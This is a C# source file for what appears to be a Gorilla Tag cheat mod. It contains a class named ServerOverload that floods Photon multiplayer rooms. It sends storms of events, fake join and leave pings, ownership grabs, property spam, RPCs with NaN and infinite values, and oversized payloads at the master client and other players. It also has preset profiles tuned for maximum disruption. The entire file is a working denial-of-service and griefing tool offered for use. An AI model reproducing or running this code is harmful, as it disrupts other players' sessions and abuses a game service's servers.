using ExitGames.Client.Photon;
using GorillaNetworking;
using Photon.Pun;
using Photon.Realtime;
using System;
using System.Collections.Generic;
using UnityEngine;
using Vaga.Classes;
using Random = UnityEngine.Random;

namespace Vaga.Mods
{
    /// <summary>
    /// ServerOverload — maximum client-side Photon traffic flood.
    /// Combines event storms, join pings, ownership thrash, property
    /// spam, RPC spam, and oversized payloads to overload room
    /// processing / master client / other peers.
    /// </summary>
    internal static class ServerOverload
    {
        public static bool Enabled;

        // Extreme defaults
        public static int BurstsPerTick = 48;
        public static float TickRate = 0.02f;
        public static int PayloadBytes = 1024;
        public static bool HitMaster = true;
        public static bool HitAll = true;

        public static bool Events = true;
        public static bool JoinPings = true;
        public static bool Ownership = true;
        public static bool RoomProps = true;
        public static bool PlayerProps = true;
        public static bool RPCs = true;
        public static bool InstantiateDestroy = true;

        private static float _next;
        private static readonly byte[] Codes =
        {
            200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210,
            211, 220, 230, 240, 250, 251, 252, 253, 254, 255
        };

        private static readonly string[] RpcNames =
        {
            "RPC_InitializeNoobMaterial",
            "RPC_UpdateCosmetics",
            "RPC_PlayHandTap",
            "RPC_Drop",
            "RPC_TagPlayer",
            "RPC_UpdateColor"
        };

        public static void Update()
        {
            if (!Enabled || !PhotonNetwork.InRoom) return;
            if (Time.time < _next) return;
            _next = Time.time + TickRate;

            for (int i = 0; i < BurstsPerTick; i++)
            {
                if (Events) EventStorm();
                if (JoinPings) JoinPingStorm();
                if (Ownership) OwnershipStorm();
                if (RoomProps) RoomPropStorm();
                if (PlayerProps) PlayerPropStorm();
                if (RPCs) RpcStorm();
                if (InstantiateDestroy) InstDestroyStorm();
            }
        }

        // ── event storm ──────────────────────────────────────────────────

        private static void EventStorm()
        {
            try
            {
                byte code = Codes[Random.Range(0, Codes.Length)];
                object payload = FatPayload();

                RaiseEventOptions opts = BuildOpts();
                PhotonNetwork.RaiseEvent(code, payload, opts, SendOptions.SendReliable);
                PhotonNetwork.RaiseEvent(code, payload, opts, SendOptions.SendUnreliable);
            }
            catch { }
        }

        private static void JoinPingStorm()
        {
            try
            {
                int fakeActor = Random.Range(2, 250);
                object data = new object[]
                {
                    fakeActor,
                    PhotonNetwork.LocalPlayer.ActorNumber,
                    PhotonNetwork.LocalPlayer.UserId ?? "x",
                    PhotonNetwork.LocalPlayer.NickName ?? "ov",
                    true,
                    PhotonNetwork.ServerTimestamp,
                    FatBytes(128)
                };

                RaiseEventOptions opts = BuildOpts();
                PhotonNetwork.RaiseEvent(255, data, opts, SendOptions.SendReliable); // join
                PhotonNetwork.RaiseEvent(254, data, opts, SendOptions.SendUnreliable); // leave
            }
            catch { }
        }

        private static void OwnershipStorm()
        {
            try
            {
                var views = Vaga.Mods.LeakGuard.Views();
                if (views == null || views.Length == 0) return;
                for (int i = 0; i < 3; i++)
                {
                    var v = views[Random.Range(0, views.Length)];
                    if (v == null) continue;
                    v.RequestOwnership();
                    PhotonNetwork.RaiseEvent(209,
                        new object[] { v.ViewID, PhotonNetwork.LocalPlayer.ActorNumber },
                        BuildOpts(), SendOptions.SendReliable);
                }
            }
            catch { }
        }

        private static void RoomPropStorm()
        {
            try
            {
                var h = new ExitGames.Client.Photon.Hashtable();
                for (int i = 0; i < 8; i++)
                    h[$"ov{Random.Range(0, 99999)}"] = Random.Range(int.MinValue, int.MaxValue);
                PhotonNetwork.CurrentRoom.SetCustomProperties(h);
            }
            catch { }
        }

        private static void PlayerPropStorm()
        {
            try
            {
                var h = new ExitGames.Client.Photon.Hashtable();
                for (int i = 0; i < 6; i++)
                    h[$"lp{Random.Range(0, 99999)}"] = Random.value;
                PhotonNetwork.LocalPlayer.SetCustomProperties(h);
            }
            catch { }
        }

        private static void RpcStorm()
        {
            try
            {
                VRRig rig = RigManager.GetRandomVRRig(false);
                if (rig == null) return;
                PhotonView view = RigManager.GetPhotonViewFromVRRig(rig);
                if (view == null) return;
                string rpc = RpcNames[Random.Range(0, RpcNames.Length)];
                view.RPC(rpc, RpcTarget.Others, float.NaN, Vector3.positiveInfinity, int.MaxValue);
            }
            catch { }
        }

        private static void InstDestroyStorm()
        {
            try
            {
                RaiseEventOptions opts = BuildOpts();
                // destroy-style
                PhotonNetwork.RaiseEvent(201, new object[] { Random.Range(1000, 50000) }, opts, SendOptions.SendReliable);
                // instantiate-style
                PhotonNetwork.RaiseEvent(202, new object[]
                {
                    "PhotonPrefabs/DestroyAfterTime",
                    Vector3.zero,
                    Quaternion.identity,
                    0,
                    new int[] { Random.Range(1000, 9999) },
                    PhotonNetwork.LocalPlayer.ActorNumber,
                    PhotonNetwork.ServerTimestamp
                }, opts, SendOptions.SendReliable);
            }
            catch { }
        }

        // ── helpers ──────────────────────────────────────────────────────

        private static RaiseEventOptions BuildOpts()
        {
            var opts = new RaiseEventOptions { CachingOption = EventCaching.DoNotCache };
            if (HitMaster && !HitAll && PhotonNetwork.MasterClient != null)
            {
                opts.TargetActors = new[] { PhotonNetwork.MasterClient.ActorNumber };
                opts.Receivers = ReceiverGroup.Others;
            }
            else
            {
                opts.Receivers = HitAll ? ReceiverGroup.All : ReceiverGroup.Others;
            }
            return opts;
        }

        private static object FatPayload()
        {
            return new object[]
            {
                PhotonNetwork.LocalPlayer.ActorNumber,
                Random.Range(int.MinValue, int.MaxValue),
                float.NaN,
                float.PositiveInfinity,
                Vector3.positiveInfinity,
                FatBytes(PayloadBytes),
                "overload",
                new Dictionary<byte, object>
                {
                    { 0, FatBytes(64) },
                    { 1, float.NaN },
                    { 245, PhotonNetwork.LocalPlayer.ActorNumber }
                }
            };
        }

        private static byte[] FatBytes(int n)
        {
            n = Mathf.Clamp(n, 16, 4096);
            byte[] b = new byte[n];
            for (int i = 0; i < n; i++) b[i] = (byte)(i & 0xFF);
            return b;
        }

        // ── profiles ─────────────────────────────────────────────────────

        public static void Soft()
        {
            BurstsPerTick = 12;
            TickRate = 0.06f;
            PayloadBytes = 256;
            InstantiateDestroy = false;
            RoomProps = false;
        }

        public static void Hard()
        {
            BurstsPerTick = 48;
            TickRate = 0.02f;
            PayloadBytes = 1024;
            Events = JoinPings = Ownership = RoomProps = PlayerProps = RPCs = InstantiateDestroy = true;
            HitMaster = true;
            HitAll = true;
        }

        /// <summary>Sustained max for several frames of pure burst.</summary>
        public static void OverloadNow()
        {
            if (!PhotonNetwork.InRoom) return;
            int save = BurstsPerTick;
            float saveRate = TickRate;
            BurstsPerTick = 80;
            TickRate = 0.01f;
            for (int t = 0; t < 40; t++)
            {
                for (int i = 0; i < BurstsPerTick; i++)
                {
                    EventStorm();
                    JoinPingStorm();
                    OwnershipStorm();
                    RoomPropStorm();
                    PlayerPropStorm();
                    RpcStorm();
                    InstDestroyStorm();
                }
            }
            BurstsPerTick = save;
            TickRate = saveRate;
        }

        public static void Status()
        {
            Debug.Log($"[ServerOverload] On={Enabled} Bursts={BurstsPerTick} Rate={TickRate} " +
                      $"Payload={PayloadBytes} Master={HitMaster} All={HitAll}");
        }
    }
}
